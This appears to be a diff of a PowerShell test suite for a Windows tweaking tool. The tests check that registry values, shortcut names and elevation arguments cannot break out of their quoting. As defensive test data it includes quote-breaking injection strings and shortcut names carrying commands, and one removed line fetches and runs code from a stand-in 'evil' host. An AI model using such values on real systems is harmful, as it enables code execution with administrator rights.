@@ -43,10 +43,8 @@ foreach ($f in (Get-ChildItem (Join-Path $root 'src') -Filter '*.ps1' | Sort-Obj
 }
 
 # 01-header cannot be dot-sourced whole - its param block must come first and
-# its top level relaunches the process elevated. But the argument-escaping used
-# to build that elevated command line lives in it, and leaving the single most
-# security-critical function in the codebase untestable is not acceptable.
-# So its function DEFINITIONS are lifted out by parsing, and nothing else runs.
+# its top level relaunches the process elevated. Its function DEFINITIONS are
+# lifted out by parsing so they can be tested, and nothing else runs.
 $headerAst = [System.Management.Automation.Language.Parser]::ParseFile(
     (Join-Path (Join-Path $root 'src') '01-header.ps1'), [ref]$null, [ref]$null)
 foreach ($fn in $headerAst.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $false)) {
@@ -591,36 +589,177 @@ Test-Phase 'Presets are genuinely different from each other' {
     if ($recommended -ge $items.Count) { throw 'Recommended would still select everything' }
 }
 
-# This program relaunches itself as administrator by composing a command line.
-# Anything interpolated into that string crosses a privilege boundary, so an
-# unescaped quote is not a formatting bug - it is arbitrary code running with
-# full rights immediately after the user approves a UAC prompt they believe they
-# are granting to Trim.
-Test-Phase 'Elevation arguments cannot break out of their quoting' {
-    $attacks = @(
-        "x'; Start-Process calc; '",
-        "x' ; iex (irm http://evil/) ; '",
-        "'''",
-        "a'b'c",
-        "C:\path with 'quotes' in it.json"
-    )
+# The undo script embeds registry paths, value names, old values and file
+# paths, and some of those were chosen by whatever wrote them - a startup
+# entry's name, a shortcut in the Startup folder. It is run later, often as
+# administrator, so a value that ends its string early is code running with
+# those rights.
+Test-Phase 'Values in the undo script cannot break out of their quoting' {
+    # PowerShell ends a single-quoted string at the ASCII apostrophe and at the
+    # four typographic quotes U+2018 to U+201B.
+    $quotes  = @(0x27, 0x2018, 0x2019, 0x201A, 0x201B | ForEach-Object { [string][char]$_ })
+    $attacks = @("a'b'c", "'''", "C:\path with 'quotes' in it.lnk", "two`r`nlines")
+    foreach ($q in $quotes) { $attacks += "x$q; Write-Output INJECTED #" }
     foreach ($a in $attacks) {
-        $escaped = ConvertTo-SafeArgument $a
-        # Rebuild the exact construction the elevation path uses and confirm the
-        # value survives as a single literal rather than becoming code.
-        $rebuilt = Invoke-Expression "'$escaped'"
-        if ($rebuilt -ne $a) { throw "escaping changed the value: '$a' became '$rebuilt'" }
+        $content = ConvertTo-QuotedContent $a
+        $line    = "Remove-ItemProperty -LiteralPath '$content' -Name '$content' -Force"
+        $tokens = $null; $errors = $null
+        [void][System.Management.Automation.Language.Parser]::ParseInput($line, [ref]$tokens, [ref]$errors)
+        $commands = @($tokens | Where-Object { $_.TokenFlags -band [System.Management.Automation.Language.TokenFlags]::CommandName })
+        if (@($errors).Count -or $commands.Count -ne 1) { throw "a value broke out of its quoting: $a" }
+        # Only evaluated once the parse above has shown it is a single literal.
+        $back = & ([scriptblock]::Create("'$content'"))
+        if ($back -cne $a) { throw "escaping changed the value: '$a' became '$back'" }
+    }
+    if ((ConvertTo-QuotedContent '') -ne '')    { throw 'an empty string was not handled' }
+    if ((ConvertTo-QuotedContent $null) -ne '') { throw 'null was not handled' }
+
+    # Doubling only the ASCII apostrophe is the escape that misses the other
+    # four, so it is not written anywhere in src\.
+    foreach ($f in (Get-ChildItem (Join-Path $root 'src') -Filter '*.ps1')) {
+        $text = Get-Content -Raw -Encoding UTF8 -LiteralPath $f.FullName
+        if ($text -match '-replace\s+"''"\s*,\s*"''''"') {
+            throw "$($f.Name) escapes a single-quoted string by doubling only the ASCII apostrophe - use ConvertTo-QuotedContent"
+        }
+    }
+}
+
+Test-Phase 'A shortcut moved out of the Startup folder comes back, whatever it is called' {
+    # Disable-StartupItem moves the shortcut for real and records the move back
+    # as a line of PowerShell for the undo script. The file names come from
+    # whatever put them in the Startup folder, so they include ones written to
+    # break out of that line.
+    $problems = [System.Collections.Generic.List[string]]::new()
+    $dir      = Join-Path ([IO.Path]::GetTempPath()) "trim-startup-$([Guid]::NewGuid().ToString('N'))"
+    $wasDry   = $DryRun
+    $kept     = @($script:UndoExtra)
+    $names    = @(
+        'plain.lnk',
+        "it's.lnk",
+        "Bob$([char]0x2019)s app.lnk",
+        "x$([char]0x2019); New-Item -ItemType File -Force -Name injected.txt #.lnk",
+        "x'; New-Item -ItemType File -Force -Name injected.txt #.lnk"
+    )
+    try {
+        New-Item -ItemType Directory -Force -Path $dir | Out-Null
+        Set-Variable -Name DryRun -Value $false -Scope Script
+        $script:UndoExtra.Clear()
+        foreach ($name in $names) {
+            $path = Join-Path $dir $name
+            [IO.File]::WriteAllText($path, $name)
+            $entry = [pscustomobject]@{ Name = $name; Source = 'Startup folder'; CanChange = $true; Location = $dir; Command = $path; State = 'Enabled' }
+            if (-not (Disable-StartupItem -Item $entry)) { $problems.Add("'$name' was not moved") | Out-Null; continue }
+            if (Test-Path -LiteralPath $path) { $problems.Add("'$name' is still in the Startup folder") | Out-Null }
+            if (-not (Test-Path -LiteralPath (Join-Path (Join-Path $dir 'Disabled by Trim') $name))) {
+                $problems.Add("'$name' did not arrive in 'Disabled by Trim'") | Out-Null
+            }
+        }
+        if ($script:UndoExtra.Count -ne $names.Count) {
+            throw "expected $($names.Count) undo line(s), recorded $($script:UndoExtra.Count)"
+        }
+
+        # Parsed before anything runs: the lines must be nothing but Move-Item.
+        $undo = $script:UndoExtra -join "`r`n"
+        $tokens = $null; $errors = $null
+        [void][System.Management.Automation.Language.Parser]::ParseInput($undo, [ref]$tokens, [ref]$errors)
+        $commands = @($tokens | Where-Object { $_.TokenFlags -band [System.Management.Automation.Language.TokenFlags]::CommandName } | ForEach-Object { $_.Text })
+        if (@($errors).Count -or @($commands | Where-Object { $_ -ne 'Move-Item' }).Count -or $commands.Count -ne $names.Count) {
+            throw "the undo lines are not $($names.Count) plain Move-Item commands: $($commands -join ', ')"
+        }
+
+        # Then run from inside the fixture, so anything that did escape would
+        # leave its file where it can be seen.
+        Push-Location -LiteralPath $dir
+        try { & ([scriptblock]::Create($undo)) } finally { Pop-Location }
+        foreach ($name in $names) {
+            $back = Join-Path $dir $name
+            if (-not (Test-Path -LiteralPath $back)) { $problems.Add("undo did not bring back '$name'") | Out-Null }
+            elseif ([IO.File]::ReadAllText($back) -ne $name) { $problems.Add("'$name' came back with the wrong contents") | Out-Null }
+        }
+        if (Test-Path -LiteralPath (Join-Path $dir 'injected.txt')) { $problems.Add('a file name ran as code in the undo script') | Out-Null }
+    } finally {
+        Set-Variable -Name DryRun -Value $wasDry -Scope Script
+        $script:UndoExtra.Clear()
+        foreach ($l in $kept) { $script:UndoExtra.Add($l) | Out-Null }
+        if (Test-Path -LiteralPath $dir) { Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+    if ($problems.Count) { throw ($problems -join '; ') }
+}
+
+# Start-Process joins -ArgumentList with spaces and quotes nothing, and the
+# process it starts splits the result again. Everything that elevates goes
+# through Join-CommandLine, and what arrives has to be exactly what was sent.
+Test-Phase 'Arguments reach the elevated process exactly as they were sent' {
+    $sent = @(
+        'C:\Users\Jo Smith\AppData\Local\Temp\trim.ps1',
+        'plain', 'two words', 'C:\ends in a slash\', 'C:\ends\', 'say "hi"',
+        'back\"slash', "tab`tinside", "it's", 'Extras,Gaming'
+    )
+    $dir  = Join-Path ([IO.Path]::GetTempPath()) "trim-args-$([Guid]::NewGuid().ToString('N'))"
+    $echo = Join-Path $dir 'echo args.ps1'
+    $out  = Join-Path $dir 'received.json'
+    try {
+        New-Item -ItemType Directory -Force -Path $dir | Out-Null
+        [IO.File]::WriteAllText($echo, 'ConvertTo-Json -InputObject @($args) | Set-Content -LiteralPath (Join-Path $PSScriptRoot ''received.json'') -Encoding UTF8')
+        # The same construction the elevation uses, minus the elevation.
+        $line = Join-CommandLine (@('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $echo) + $sent)
+        Start-Process powershell.exe -ArgumentList $line -Wait -WindowStyle Hidden
+        if (-not (Test-Path -LiteralPath $out)) { throw "the script never ran; the command line was: $line" }
+        # Windows PowerShell's ConvertFrom-Json emits an array as one object;
+        # sending it through the pipeline again yields its elements.
+        $parsed = Get-Content -Raw -Encoding UTF8 -LiteralPath $out | ConvertFrom-Json
+        $got = @($parsed | ForEach-Object { $_ })
+        if ($got.Count -ne $sent.Count) {
+            throw "sent $($sent.Count) argument(s), $($got.Count) arrived: $(($got | ForEach-Object { "[$_]" }) -join ' ')"
+        }
+        for ($i = 0; $i -lt $sent.Count; $i++) {
+            if ($got[$i] -cne $sent[$i]) { throw "argument $i was sent as [$($sent[$i])] and arrived as [$($got[$i])]" }
+        }
+    } finally {
+        if (Test-Path -LiteralPath $dir) { Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue }
     }
 
-    # Control characters are refused outright rather than escaped.
-    foreach ($bad in @("x`0y", "x`ny", "x`ry")) {
-        $threw = $false
-        try { ConvertTo-SafeArgument $bad } catch { $threw = $true }
-        if (-not $threw) { throw 'a control character was accepted into an elevated argument' }
+    # And nothing elevates with an array Start-Process would join unquoted.
+    foreach ($name in @('01-header.ps1', '99-main.ps1')) {
+        $text = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') $name)
+        $calls = [regex]::Matches($text, 'Start-Process[^\r\n]*-Verb RunAs[^\r\n]*')
+        if ($calls.Count -eq 0) { throw "$name no longer elevates - re-read this check before deleting it" }
+        foreach ($c in $calls) {
+            if ($c.Value -notmatch '-ArgumentList \(Join-CommandLine ') {
+                throw "$name elevates without Join-CommandLine: $($c.Value.Trim())"
+            }
+        }
+    }
+}
+
+# -File hands "-Skip Extras,Gaming" over as the one string 'Extras,Gaming', and
+# the elevated relaunch uses -File. Unsplit, it names no phase: -Skip skips
+# nothing, and the elevated run applies what the user asked it to leave alone.
+Test-Phase 'A phase list survives the elevated relaunch' {
+    $cases = @(
+        @{ In = @('Extras,Gaming');      Want = 'Extras|Gaming' }
+        @{ In = @('Extras', 'Gaming');   Want = 'Extras|Gaming' }
+        @{ In = @(' Extras , Gaming ,'); Want = 'Extras|Gaming' }
+        @{ In = @();                     Want = '' }
+    )
+    foreach ($c in $cases) {
+        $got = @(Split-PhaseList $c.In) -join '|'
+        if ($got -cne $c.Want) { throw "Split-PhaseList turned [$($c.In -join '][')] into [$got]" }
     }
 
-    if ((ConvertTo-SafeArgument '') -ne '')       { throw 'empty string was not handled' }
-    if ((ConvertTo-SafeArgument $null) -ne '')    { throw 'null was not handled' }
+    # What the elevated run then does with it, through the real gate.
+    $Only = @()
+    $Skip = @(Split-PhaseList @('Extras,Gaming'))
+    if (Test-PhaseEnabled 'Extras')          { throw "-Skip 'Extras,Gaming' still runs Extras" }
+    if (-not (Test-PhaseEnabled 'Network'))  { throw "-Skip 'Extras,Gaming' stopped a phase it did not name" }
+
+    # And the header splits both lists before it can elevate.
+    $header  = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '01-header.ps1')
+    $elevate = $header.IndexOf('-Verb RunAs')
+    foreach ($v in @('Skip', 'Only')) {
+        $m = [regex]::Match($header, "(?m)^\`$$v = @\(Split-PhaseList \`$$v\)\s*$")
+        if (-not $m.Success -or $elevate -lt 0 -or $m.Index -gt $elevate) { throw "01-header does not split -$v before it elevates" }
+    }
 }
 
 # Running as administrator means a bare tool name resolves through PATH, and a
@@ -3790,6 +3929,41 @@ Test-Phase 'Nothing claims the panes wait for Apply' {
         }
     }
 
+    if ($problems.Count) { throw ($problems -join '; ') }
+}
+
+Test-Phase 'Every help block sits on the function it describes' {
+    # PowerShell attaches a help block only to the function directly below it,
+    # with at most one blank line between. A function inserted between the two
+    # leaves the block describing nothing, and the function it was written for
+    # with no help at all - so every .SYNOPSIS in src\ has to be one that
+    # PowerShell itself attaches to a function or to the script.
+    $problems = [System.Collections.Generic.List[string]]::new()
+    foreach ($f in (Get-ChildItem (Join-Path $root 'src') -Filter '*.ps1' | Sort-Object Name)) {
+        $tokens = $null
+        $ast = [System.Management.Automation.Language.Parser]::ParseFile($f.FullName, [ref]$tokens, [ref]$null)
+        $attached = [System.Collections.Generic.HashSet[string]]::new()
+        $owners = @($ast) + @($ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true))
+        foreach ($o in $owners) {
+            $help = $o.GetHelpContent()
+            if ($help -and $help.Synopsis) { [void]$attached.Add((($help.Synopsis -replace '\s+', ' ').Trim())) }
+        }
+        # 01-header.ps1 opens with the script's own help. It only becomes the
+        # script's help at the top of the build, so it is not attached to
+        # anything in this file alone; Get-Help against the build is tested
+        # on its own.
+        $leading = ($f.Name -eq '01-header.ps1')
+        foreach ($t in $tokens) {
+            if ($t.Kind -eq 'NewLine') { continue }
+            if ($t.Kind -ne 'Comment') { $leading = $false; continue }
+            if ($leading -and $t.Text.StartsWith('<#')) { $leading = $false; continue }
+            if ($t.Text -notmatch '(?s)^<#.*?\.SYNOPSIS\s*(.*?)(?:\r?\n[ \t]*\r?\n|\r?\n\s*\.[A-Z]+\b|#>)') { continue }
+            $synopsis = ($Matches[1] -replace '\s+', ' ').Trim()
+            if (-not $attached.Contains($synopsis)) {
+                $problems.Add("$($f.Name):$($t.Extent.StartLineNumber) '$synopsis' is not attached to any function") | Out-Null
+            }
+        }
+    }
     if ($problems.Count) { throw ($problems -join '; ') }
 }
 
